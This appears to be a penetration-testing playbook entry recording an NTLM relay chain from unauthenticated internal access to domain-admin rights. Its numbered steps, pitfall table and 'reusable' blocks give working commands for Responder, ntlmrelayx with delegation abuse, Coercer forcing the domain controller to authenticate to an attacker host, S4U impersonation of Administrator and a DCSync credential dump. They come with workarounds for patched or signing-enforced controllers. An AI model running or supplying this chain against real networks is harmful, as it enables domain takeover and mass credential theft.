# [2026-04] NTLM Relay + Coercer → domain-admin privileges (no password needed)

## Scenario category
Penetration testing / internal-network penetration / AD attack

## Goal summary
With an internal-network access point but no credentials, use an NTLM Relay attack chain to obtain domain-admin privileges.

## Full execution path

1. After internal-network access, start Responder and listen with SMB/HTTP disabled.
   ```bash
   # Edit /etc/responder/Responder.conf
   # SMB = Off, HTTP = Off
   responder -I eth0 -v
   ```

2. Start ntlmrelayx and relay to LDAP for the AD CS attack.
   ```bash
   ntlmrelayx.py -t ldap://dc01.domain.local --delegate-access
   ```

3. Use Coercer to force the DC to authenticate to us.
   ```bash
   coercer coerce -u '' -p '' -d domain.local \
     -l attacker_ip -t dc01.domain.local --always-continue
   ```

4. Relay the DC machine-account NTLM authentication to LDAP.
5. Let ntlmrelayx create a machine account and configure constrained delegation.
6. Impersonate a domain administrator with S4U2Self + S4U2Proxy.
   ```bash
   getST.py -spn cifs/dc01.domain.local \
     -impersonate Administrator \
     domain.local/CREATED_MACHINE\$:'password' -dc-ip 10.0.0.1
   ```

7. Use the ticket for DCSync.
   ```bash
   export KRB5CCNAME=Administrator.ccache
   secretsdump.py -k -no-pass dc01.domain.local
   ```

## Pitfall log

| Problem | Cause | Solution | Time |
|------|------|---------|------|
| Coercer could not trigger authentication | The target DC was patched and disabled PetitPotam | Use PrinterBug (MS-RPRN) | 30min |
| ntlmrelayx reported `LDAP signing required` | The DC enabled LDAP signing | Relay to LDAPS (636) or HTTP AD CS | 20min |
| The created machine account could not use S4U | Domain policy limited machine-account creation | Use an existing low-privilege domain-user account instead | 15min |

## Toolchain findings
- Coercer is easier than calling PetitPotam manually because it tries several protocols automatically.
- The ntlmrelayx `--delegate-access` option is the key. It configures delegation automatically.
- If LDAP signing is enabled, relay to the AD CS HTTP endpoint (ESC8).

## Key code / commands

```bash
# Complete attack chain (requires three terminals)
# Terminal 1: Responder
responder -I eth0 -v

# Terminal 2: ntlmrelayx
ntlmrelayx.py -t ldap://dc01.domain.local --delegate-access --escalate-user attacker

# Terminal 3: Coercer
coercer coerce -u '' -p '' -d domain.local -l attacker_ip -t dc01.domain.local
```

## Reusable patterns / script fragments

```bash
# Quick NTLM Relay feasibility check
# 1. Check SMB signing
crackmapexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt

# 2. Check LDAP signing
crackmapexec ldap dc01.domain.local -u '' -p '' -M ldap-checker

# 3. Check triggerable protocols
coercer scan -u user -p pass -d domain.local -t dc01.domain.local
```

## Improvement suggestions for this package
- Coercer and Responder are already covered by routing and bootstrap.
- ntlmrelayx belongs to the impacket suite, which Kali preinstalls.

## Evolution actions
- [x] No update needed (already covered)

## Environment information
- Kali 2026.1, impacket 0.12.0, coercer 2.4.3
- Target: Windows Server 2022 DC, domain functional level 2016
- Prerequisite: an internal-network access point obtained through a VPN vulnerability
